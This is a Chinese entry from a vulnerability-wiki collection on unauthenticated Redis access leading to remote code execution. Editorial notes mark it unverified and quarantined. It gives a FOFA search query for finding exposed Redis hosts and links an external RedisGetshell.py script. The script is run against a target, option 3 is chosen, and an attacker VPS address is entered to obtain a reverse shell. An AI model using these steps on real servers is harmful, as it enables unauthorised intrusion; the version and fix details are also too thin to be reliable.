---
source: "wy876 漏洞文库"
title: "Redis存在未授权访问导致的RCE"
product: "Redis开放管理能力（具体利用链未说明）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "quarantined"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
source_status: "unknown"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-b550775d3c39416399880c2d"
entity_id: "ve-b550775d3c39416399880c2d"
schema_version: "1"
---

# Redis存在未授权访问导致的RCE

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 证据范围：只有工具命令和选3，无法确认使用复制模块、持久化写文件还是其他链，不应直接归某CVE。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 影响版本只Redis，缺鉴权/ACL/网络与写权限前提
- RedisGetshell.py为外部txt附件，未提供源码/版本/校验，本审阅未下载执行
- 无回显/复现结果与修复措施
- 工具选3行为不透明，可能改变复制/数据/文件，不能称安全验证

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞描述
redis是一个非常快速的，开源的，支持网络，可以基于内存，也可以持久化的日志型，非关系型的键值对数据库。并提供了多种语言的api。有java，c/c++,c#,php，JavaScript，perl，object-c，python，ruby，erlang等客户端，使用方便。Redis存在未授权访问导致的RCE

# 二、影响版本
Redis

# 三、资产测绘
```plain
app="redis"
```


# 三、漏洞复现


反弹shell使用脚本

[RedisGetshell.py](https://www.yuque.com/attachments/yuque/0/2024/txt/29512878/1732673083520-cd32abee-9703-4958-aa1c-02c3d6e94e7b.txt)

```plain
python RedisGetshell.py -H 127.0.0.1 -P 6379
```

选3，之后输入自己vps地址，即可反弹shell


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hrg8q2mccg664x20>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
